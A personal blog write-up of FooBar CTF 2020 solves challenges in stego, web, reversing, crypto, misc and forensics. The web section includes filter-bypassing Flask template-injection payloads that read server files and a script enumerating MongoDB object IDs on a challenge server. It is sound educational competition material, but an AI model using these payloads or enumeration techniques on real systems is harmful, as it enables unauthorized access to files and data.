---
title: 'FooBar CTF 2020 &#8211; WriteUp Part I'
author: yakuhito
layout: post
permalink: foobarctf-2020-writeup-part-i
image: /images/foobarctf-2020-writeup-part-i/foobarctf-2020-writeup-part-i.jpg
category: blog
---
 

This weekend, apart from participating to CodeGate 2020 CTF Qualifier (and hopefully qualifying in the finals), I had the pleasure of playing FooBarCTF 2020, an interesting competition held by students from NIT Durgapur, India. While the latter wasn’t listed on CTFTime, it was still full of interesting challenges. Below you can find my writeup for some challenges, as well as a link to the second part.

## Legend

#### Shell

Can be found in [part II.](https://blog.kuhi.to/foobarctf_2020_writeup_part_ii)

#### Stego

  * [Nothing’s in here](#stego1)

#### Web

  * [GET me if you can](#web1)
  * [Cookie store](#web2)
  * [Strong vaccine](#web3)
  * [Client side is untrustworthy](#web4)
  * [Useless Website](#web5)
  * [I EZ](#web6)
  * [Cardgen](#web7)

#### Reverse

  * [Stranger Things](#reverse1)

#### Crypto

  * [Teacher is absent](#crypto1)
  * [Julius not helping](#crypto2)
  * [Happy to see me](#crypto3)

#### Misc

  * [U cant C me](#misc1)
  * [Rock n Roll Baby](#misc2)
  * [Secure app](#misc3)
  * [Cant Read This](#misc4)

#### Forensics

  * [The EXORcist](#forensics1)
  * [Life is Hard](#forensics2)

## Nothing’s in here {#stego1}

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image.png"></center>
</div>

This was the only challenge in the ‘stego’ category. Attached was an image with Marvel’s Endgame movie:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/endgame-1024x576.jpg"></center>
</div>

I ran the usual tools on it (exiftool, steghide, stegsolve) and I noticed an anomaly on the least significant bits. For example, red plane 2 looked like this:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-1-1024x576.png"></center>
</div>

That meant that the flag was probably hidden using lsb steganography. I tried using stegbrute, thinking that the flag was simply protected by a password, but it turned out that wasn’t the case. After looking through [John H’s ctf-katana](https://github.com/JohnHammond/ctf-katana), I managed to extract the flag by using [jsteg](https://github.com/lukechampine/jsteg):

{% highlight bash %}
yakuhito@furry-catstation:~/ctf/foobar2020/nothingsinhere$ ./jsteg-linux-amd64
Usage: jsteg [command] [args]

Commands:
    jsteg hide in.jpg [FILE] [out.jpg]
    jsteg reveal in.jpg [FILE]
yakuhito@furry-catstation:~/ctf/foobar2020/nothingsinhere$ ./jsteg-linux-amd64 reveal endgame.jpg 
GLUG{51n6h4l_15_51n6l3?}
yakuhito@furry-catstation:~/ctf/foobar2020/nothingsinhere$ 

{% endhighlight %}

**Flag:** GLUG{51n6h4l\_15\_51n6l3?}

## GET me if you can {#web1}
<center><img src="/images/foobarctf-2020-writeup-part-i/image-2.png"></center>

This was more like a warm-up challenge; I was provided with an URL that hosted the following page:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-3.png"></center>
</div>

Wanting to solve the challenge faster, I clicked the button without inspecting the page’s source code:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-4.png"></center>
</div>

I noticed the URL contained a parameter named ‘auth’ that was set to ‘false’, so I changed it to ‘true’ and got the flag:
<center><img src="/images/foobarctf-2020-writeup-part-i/image-5.png"></center>

**Flag:** GLUG{5n0wd3n\_3471n6\_53cur17y} 

## Cookie store {#web2}

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-6.png"></center>
</div>

The provided URL hosted a simple site:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-7.png"></center>
</div>

The site didn’t offer me a lot of options, so I tried buying the flag and got an error:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-8.png"></center>
</div>

I remembered the name of the challenge and realized that my points were stored unencrypted inside a cookie. I used a cookie editor and changed my points to 1337:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-9.png"></center>
</div>

After that, I purchased the flag:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-10.png"></center>
</div>

As a crypto enthusiast, I instantly recognized the reference to affine cipher. Also, the key was either (5,8) or (8,5), because usual reviews include ratings from a scale of 1 to 5 or 10. I decrypted the flag using [cryptii](https://cryptii.com/):

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-15-1024x355.png"></center>
</div>

**Flag:** GLUG{cookies\_are\_good}

## Strong vaccine {#web3}

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-12.png"></center>
</div>

After reading the challenge description, I was 100% sure this was an SQL injection challenge without accessing the site. As it turned out, I was right.

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-13.png"></center>
</div>

As this technique is very common, I won’t go into detail here.

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-14.png"></center>
</div>

**Flag:** GLUG{youre\_a\_ good_doc}

## Client side is untrustworthy {#web4}

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-16.png"></center>
</div>

The given URL only hosted a simple page:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-17.png"></center>
</div>

However, upon closer inspection, the page seemed to contain an obfuscated javascript function that validates the password. After formatting it for a bit, the code looked like this:

{% highlight bash %}
var _0x5a46 = ['42113}', 'bit_messy', 'this', 'Password\x20Verified', 'Incorrect\x20password', 'getElementById', 'value', 'substring', 'GLUG{', 'this_is_'];
(function (_0x4bd822, _0x2bd6f7) {
	var _0xb4bdb3 = function (_0x1d68f6) {
		while (--_0x1d68f6) {
			_0x4bd822['push'](_0x4bd822['shift']());
		}
	};
	_0xb4bdb3(++_0x2bd6f7);
}(_0x5a46, 0x1b3));
var _0x4b5b = function (_0x2d8f05, _0x4b81bb) {
	_0x2d8f05 = _0x2d8f05 - 0x0;
	var _0x4d74cb = _0x5a46[_0x2d8f05];
	return _0x4d74cb;
};

function verify() {
	checkpass = document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];
	split = 0x4;
	if (checkpass[_0x4b5b('0x2')](0x0, split * 0x2) == _0x4b5b('0x3')) {
		if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n') {
			if (checkpass[_0x4b5b('0x2')](split * 0x2, split * 0x2 * 0x2) == _0x4b5b('0x4')) {
				if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT') {
					if (checkpass[_0x4b5b('0x2')](split * 0x3 * 0x2, split * 0x4 * 0x2) == _0x4b5b('0x5')) {
						if (checkpass['substring'](0x6, 0xb) == 'F{not') {
							if (checkpass[_0x4b5b('0x2')](split * 0x2 * 0x2, split * 0x3 * 0x2) == _0x4b5b('0x6')) {
								if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7')) {
									alert(_0x4b5b('0x8'));
								}
							}
						}
					}
				}
			}
		}
	} else {
		alert(_0x4b5b('0x9'));
	}
}

{% endhighlight %}

I took every if statement and decoded the string that was compared with the inputted password using my browser’s console:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-18.png"></center>
</div>

I then just spotted the flag, as the validation process was a bit faulty.

**Flag:** GLUG{this\_is\_bit\_messy\_42113}

## Useless Website {#web5}

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-19.png"></center>
</div>

The given site seemed to be a copied template:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-20-1024x424.png"></center>
</div>

However, after inspecting the web traffic, I found some interesting requests:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-21.png"></center>
</div>

{% highlight bash %}
yakuhito@furry-catstation:~/ctf/foobar2020/uselesswebsite$ curl "http://138.68.252.44:7081/objects/?id=5e0cafcc1c9d440000b58aa2"
{"_id":"5e0cafcc1c9d440000b58aa2","data":"This is irrelevant."}

yakuhito@furry-catstation:~/ctf/foobar2020/uselesswebsite$ curl "http://138.68.252.44:7081/objects/?id=5e0cafeb1c9d440000b58aa3"
{"_id":"5e0cafeb1c9d440000b58aa3","data":"Seriously, this is totally not relevant"}

yakuhito@furry-catstation:~/ctf/foobar2020/uselesswebsite$ curl "http://138.68.252.44:7081/objects/?id=5e0cb0061c9d440000b58aa4"
{"_id":"5e0cb0061c9d440000b58aa4","data":"Ok, fine. Keep looking, your choice......................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................btw, actions are recorded in actions.txt"}

yakuhito@furry-catstation:~/ctf/fooyakuhito@furry-catstation:~/ctf/foobar2020/uselesswebsite$

{% endhighlight %}

The last object mentioned something about actions.txt, so I accessed that file using my browser:
<center><img src="/images/foobarctf-2020-writeup-part-i/image-22.png"></center>

After the CTF was over, the admin told me that the object ids were assigned by MongoDB and were predictable. However, I didn’t know that when I solved the challenge, so I made a script that searched for valid objects. It’s based on the idea that the first bytes of the object id are the UNIX timestamp in hex format and the other part is just an incrementing number. The final script looked like this:

{% highlight python %}
import requests
import threading
import time

a = open("dates.txt", "r").read().split("\n")

def makeReq(a, b):
	s = a + b
	url = "http://138.68.252.44:7081/objects/?id=" + s
	r = requests.get(url)
	if r.text == 'null':
		return
	print(r.url)
	print(r.text)

def process(l):
	if not l.startswith("15"):
		return
	#print(l)
	tk = "5e0cb0061c9d440000b58aa4".split("5e0cb006")[1]
	l = hex(int(l))[2:]
	a = int(tk, 16)
	for offset in range(-0, 13):
		s = l + hex(a + offset)[2:]
		#print(s)
		threading.Thread(target = makeReq, args=(l, hex(a + offset)[2:],)).start()
		#time.sleep(10)

for line in a:
	process(line)

{% endhighlight %}

Also, ‘dates.txt’ just contained the contents of ‘actions.txt’ followed by the corresponding UNIX timestamps:

{% highlight bash %}
Wed Jan 01 2020 20:12:20 GMT+0530 (India Standard Time) - added data
1577889740
Wed Jan 01 2020 20:12:51 GMT+0530 (India Standard Time) - added data
1577889771
Wed Jan 01 2020 20:13:18 GMT+0530 (India Standard Time) - added data
1577889798
Wed Jan 01 2020 20:16:39 GMT+0530 (India Standard Time) - added data
1577889999
Wed Jan 01 2020 20:17:40 GMT+0530 (India Standard Time) - added data
1577890060
Wed Jan 01 2020 20:18:16 GMT+0530 (India Standard Time) - added data
1577890096
Wed Jan 01 2020 20:34:06 GMT+0530 (India Standard Time) - added data
1577891046
Wed Jan 01 2020 20:34:16 GMT+0530 (India Standard Time) - added data
1577891056
Wed Jan 01 2020 20:34:43 GMT+0530 (India Standard Time) - added data
1577891083
Wed Jan 01 2020 20:35:10 GMT+0530 (India Standard Time) - added data
1577891110
Wed Jan 01 2020 20:35:22 GMT+0530 (India Standard Time) - added data
1577891122
Wed Jan 01 2020 20:35:40 GMT+0530 (India Standard Time) - added data
1577891140

{% endhighlight %}

Running the above script, I got the following output:

{% highlight bash %}
yakuhito@furry-catstation:~/ctf/foobar2020/uselesswebsite$ python bruteforce.py 
http://138.68.252.44:7081/objects/?id=5e0cb0cf1c9d440000b58aa5
{"_id":"5e0cb0cf1c9d440000b58aa5","data":"You are going to be very bored."}
http://138.68.252.44:7081/objects/?id=5e0cb1301c9d440000b58aa7
{"_id":"5e0cb1301c9d440000b58aa7","data":"Go on."}
http://138.68.252.44:7081/objects/?id=5e0cb10c1c9d440000b58aa6
{"_id":"5e0cb10c1c9d440000b58aa6","data":"This is going to take a long time for you."}
http://138.68.252.44:7081/objects/?id=5e0cb0061c9d440000b58aa4
{"_id":"5e0cb0061c9d440000b58aa4","data":"Ok, fine. Keep looking, your choice......................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................btw, actions are recorded in actions.txt"}
http://138.68.252.44:7081/objects/?id=5e0cb5261c9d440000b58aac
{"_id":"5e0cb5261c9d440000b58aac","data":"ok, fine."}
http://138.68.252.44:7081/objects/?id=5e0cb4f01c9d440000b58aaa
{"_id":"5e0cb4f01c9d440000b58aaa","data":"Do you seriously think there;s something useful here?"}
http://138.68.252.44:7081/objects/?id=5e0cb5441c9d440000b58aae
{"_id":"5e0cb5441c9d440000b58aae","data":"GLUG{0bj3ct_ids_ar3nt_s3cr3ts}"}
http://138.68.252.44:7081/objects/?id=5e0cb5321c9d440000b58aad
{"_id":"5e0cb5321c9d440000b58aad","data":"Next one has your flag."}
http://138.68.252.44:7081/objects/?id=5e0cb50b1c9d440000b58aab
{"_id":"5e0cb50b1c9d440000b58aab","data":"You are a very ardent person."}
http://138.68.252.44:7081/objects/?id=5e0cb4e61c9d440000b58aa9
{"_id":"5e0cb4e61c9d440000b58aa9","data":"Wait."}
yakuhito@furry-catstation:~/ctf/foobar2020/uselesswebsite$

{% endhighlight %}

**Flag:** GLUG{0bj3ct\_ids\_ar3nt_s3cr3ts}

## I EZ {#web6}

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-23.png"></center>
</div>

This one was very similar to ‘IZ’ from ISITDTU CTF 2018. To solve it, I followed [this writeup](https://graneed.hatenablog.com/entry/2018/07/29/043000). Final URL that returns the flag:

{% highlight bash %}
http://138.68.252.44:7805///?_=0.0
{% endhighlight %}

**Flag:** GLUG{c4571ng\_7hr0u6h\_7h3_3rr0r5}

## Cardgen {#web7}

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-24.png"></center>
</div>

This was one of my favorite challenges, along with the one involving ‘more’ (found in part II of this writeup). I solved it after the CTF ended, thinking that the contest is still running because of the timezone difference. The site was very elegant and I didn’t manage to find its template/source code online:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-25-1024x552.png"></center>
</div>

Basically, the site would generate FAKE credit cards with the inputted name on them. For example, this is a card I generated:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-27.png"></center>
</div>

One interesting thing to notice is the URL for generated cards:

{% highlight bash %}
http://138.68.252.44:8137/cardgen/?name=Yaku+Hito
{% endhighlight %}

After a little bit of testing, I came up with the following url:

{% highlight bash %}
http://138.68.252.44:8137/cardgen/?name={ {21*2}}
{% endhighlight %}

This resulted the card being created for 42, which, at the time of writing, is the result of 21 * 2:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-28.png"></center>
</div>

This made me conclude that the site was vulnerable to a Flask Server-Side Template Injection (SSTI) vulnrability. After further testing, I realized there was a filter in place that would disallow characters like ‘ and ” and keywords such as ‘open’ and ‘read’:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-29.png"></center>
</div>

After a lot of trial-and-error, I came up with the following two payloads:

{% highlight bash %}
?name={ {url_for.__globals__.os|attr(request.args.param)(request.args.param2,0)}}&param=open&param2=flag.txt
{% endhighlight %}

{% highlight bash %}
?name={ {url_for.__globals__.os|attr(request.args.param)(1337,100)}}&param=read
{% endhighlight %}

Basically, the first one uses os.open() to create a file descriptor for ‘flag.txt’ and the second one uses that file descriptor (in this case 13337; should be replaced with the name on the card resulted from the first request) to read 100 characters from that file. 

**Flag:** GLUG{j1nj4\_n07\_n1nj4_d!}

## Stranger Things {#reverse1}

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-30.png"></center>
</div>

If you’ve met me at least once, you probably already know that I suck at reversing. However, this challenge was really beginner-friendly and I was able to solve it. The first step was opening the binary in ghidra and viewing the list of functions:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-31.png"></center>
</div>

The ‘encode’ function was used to encode the flag, so I focused on it:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-32.png"></center>
</div>

A non-functioning equivalent in python would be:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-33.png"></center>
</div>

This encoding function was easily reversible, so I wrote a function that decodes the resulting data:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-34.png"></center>
</div>

Also, flagContainer contained the encoded flag; so I copied the hex values from ghidra and put them in the following script:

{% highlight bash %}
from Crypto.Util.number import long_to_bytes

def decode(enc):
        n = len(enc)
        dec = ""
        for i in range(n):
                dec += chr((enc[i] + 4) ^ 0x11)
        return dec

enc = long_to_bytes(0x3935783032357830) + \
      long_to_bytes(0x3235783030347830) + \
      long_to_bytes(0x6531783036367830) + \
      long_to_bytes(0x6431783039377830) + \
      long_to_bytes(0x6134783062377830) + \
      long_to_bytes(0x6237783064317830) + \
      long_to_bytes(0x3837783061347830) + \
      long_to_bytes(0x6635783031327830) + \
      long_to_bytes(0x3836783030327830)

enc = enc[::-1].decode()

enc2 = b""
arr = enc.split("0x")[1:]

for i in arr:
        enc2 += long_to_bytes(int(i,16))

# reverse, take lsb encoding into consideration
enc2 = enc2[::-1]
enc3 = b""
for i in range(0, len(enc2), 2):
        enc3 += long_to_bytes(enc2[i + 1])
        enc3 += long_to_bytes(enc2[i])

print(decode(enc3))

{% endhighlight %}

Running the above script, I got the flag:

{% highlight bash %}
yakuhito@furry-catstation:~/ctf/foobar2020/stranger_things$ python solve.py 
GLUG{3l0n_0n_m4r5}
yakuhito@furry-catstation:~/ctf/foobar2020/stranger_things$

{% endhighlight %}

**Flag:** GLUG{3l0n\_0n\_m4r5}

## Teacher is absent {#crypto1}

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-35.png"></center>
</div>

I remember seeing a similar hint at picoCTF; when a teacher is absent you get a substitute 🙂 The flag was encrypted using a simple substitution cipher. The cipher can be cracked using [quipquip](https://quipqiup.com/):

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-36.png"></center>
</div>

**Flag:** GLUG{THETHINGSYOUUSEDTOOWNNOWTHEYOWNYOU}

## Julius not helping {#crypto2}

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-37.png"></center>
</div>

Seeing the challenge title, I thought it was a simple [Caesar cipher](https://en.wikipedia.org/wiki/Caesar_cipher). However, from the french reference in the description, I concluded that the ciphertext was encrypted using the [Vigenere cipher](https://www.geeksforgeeks.org/vigenere-cipher/). I used [gullaba.de](https://www.guballa.de/vigenere-solver) to get the encryption key:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-38.png"></center>
</div>

The flag is the key wrapped in GLUG{}

**Flag:** GLUG{ettubrute}

## Happy to see me {#crypto3}

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-39.png"></center>
</div>

This was a very similar challenge to ArbCrypt from SunshineCTF 2019. I used [this writeup](https://github.com/ozancetin/CTF-Writeups/blob/master/2019/Sunshine-CTF-2019/CRYPTO/README.md) to solve the challenge.

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-40-1024x340.png"></center>
</div>

**Flag:** GLUG{arb\_you\_sad\_to\_see_me}

## U cant C me {#misc1}

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-41.png"></center>
</div>

I honestly don’t know how to explain the solution for this challenge. The flag.txt file contains a sequence of characters. In order to get its corresponding flag character for that sequence, you need to put a paper on your keyboard and draw a line between every 2 adjacent keys that you would push to get that character. For example, ‘uytfcvb’ would become ‘c’, because uyt is a vertical line, ‘tfc’ is a horizontal line and ‘cvb’ is another vertical line.

**Flag:** GLUG{cowisonthetop}

## Rock n Roll Baby {#misc2}

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-42.png"></center>
</div>

The given file contained some readable words that looked like a song:

{% highlight bash %}
yakuhito@furry-catstation:~/ctf/foobar2020/rocknrollbaby$ head -n 13 rolling_rocks 
Glug;s a CTFFFFFFF
my mind is waitin
It;s waitin

Put my mind of Glug into This
my flag is not found
put This into my flag
put my flag into Glug


shout Glug
shout Glug
shout Glug
yakuhito@furry-catstation:~/ctf/foobar2020/rocknrollbaby$

{% endhighlight %}

I recognized this to be an esoteric language named [rockstar](https://github.com/RockstarLang/rockstar). I used [this online interpreter](https://codewithrockstar.com/online) to get the script’s output:
<center><img src="/images/foobarctf-2020-writeup-part-i/image-43.png"></center>

Python can be used to convert those numbers into readable text:

{% highlight bash %}
yakuhito@furry-catstation:~/ctf/foobar2020/rocknrollbaby$ python
Python 3.6.9 (default, Nov  7 2019, 10:44:02) 
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> a = """114
... 114
... 114
... 111
... 99
... 107
... 110
... 114
... 110
... 48
... 49
... 49
... 51
... 114"""
>>> ''.join([chr(int(x)) for x in a.split("\n")])
'rrrocknrn0113r'
>>> 

{% endhighlight %}

**Flag:** GLUG{rrrocknrn0113r}

## Secure app {#misc3}

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-44.png"></center>
</div>

A .apk file was given. I used [this online decompiler](http://www.javadecompilers.com/apk) to get the Java source code, however, that turned out to be an overkill. The flag was located in the ‘AndroidManifest.xml’ file.

{% highlight bash %}
yakuhito@furry-catstation:~/ctf/foobar2020/secureapp$ grep GLUG most-secure_source_from_JADX/resources/AndroidManifest.xml 
        <meta-data android:name="com.google.android.geo.API_KEY" android:value="GLUG{7h15_15_53cur17y_57uff_4pp5}"/>
yakuhito@furry-catstation:~/ctf/foobar2020/secureapp$ 

{% endhighlight %}

**Flag:** GLUG{7h15\_15\_53cur17y\_57uff\_4pp5}

## Cant Read This {#misc4}

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-45.png"></center>
</div>

The given file was too big for me to put here. Basically, it was a JSFuck code. I used [this site](https://enkhee-osiris.github.io/Decoder-JSFuck/) to get the compiled JavaScript code back:

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-46.png"></center>
</div>

**Flag:** GLUG{this\_code\_was_weird}

## The EXORcist {#forensics1}

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-47.png"></center>
</div>

The given python file contained a QR code given in binary. I used the following script to turn it into an image:

{% highlight python %}
arr = a.split("\n")

print(len(arr))
print(len(arr[0]))

from PIL import Image

BLOCK = 1
img = Image.new('RGB', (100 * BLOCK, 100 * BLOCK))
for y in range(100):
	for x in range(100):
		if arr[x][y] == "1":
			img.putpixel((x, y), (255, 255, 255))
		else:
			img.putpixel((x, y), (0, 0, 0))

img.show()

{% endhighlight %}

After that, I scanned the resulting image with my phone and got the following data:

{% highlight bash %}
0f29392b330b5c332e175f5f17175f08170719002418
{% endhighlight %}

Judging by the challenge title, I thought that the string probably represents the flag XORed with a key. I knew the flag started with ‘GLUG{‘, so I used python to calculate the key:

{% highlight python %}
yakuhito@furry-catstation:~/ctf/foobar2020/theexorcist$ python
Python 3.6.9 (default, Nov  7 2019, 10:44:02) 
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import xor
>>> from Crypto.Util.number import long_to_bytes
>>> enc_flag = long_to_bytes(0x0f29392b330b5c332e175f5f17175f08170719002418)
>>> xor(enc_flag, 'GLUG{')
b'HellHL\x10fil\x18\x13BP$O[R^{cT'
>>> 

{% endhighlight %}

I could clearly see the key was ‘Hell’, so I used it to decrypt the flag:

{% highlight python %}
>>> xor(enc_flag, 'Hell')
b'GLUG{n0_fr33_r3d_bull}'
>>> 

{% endhighlight %}

**Flag:** GLUG{n0\_fr33\_r3d_bull}

## Life is Hard {#forensics2}

<div>
<center><img src="/images/foobarctf-2020-writeup-part-i/image-48.png"></center>
</div>

This was, again, very similar to Golly Gee Willikers from SunshineCTF 2019. I followed [this writeup](https://medium.com/ctf-writeups/sunshine-ctf-2019-write-up-c7174c0fb56) to solve it.

**Flag:** GLUG{7h15\_700\_5hall_d13}

## WriteUp Part II

You can find my solutions for the shell category [here](https://blog.kuhi.to/foobarctf_2020_writeup_part_ii).
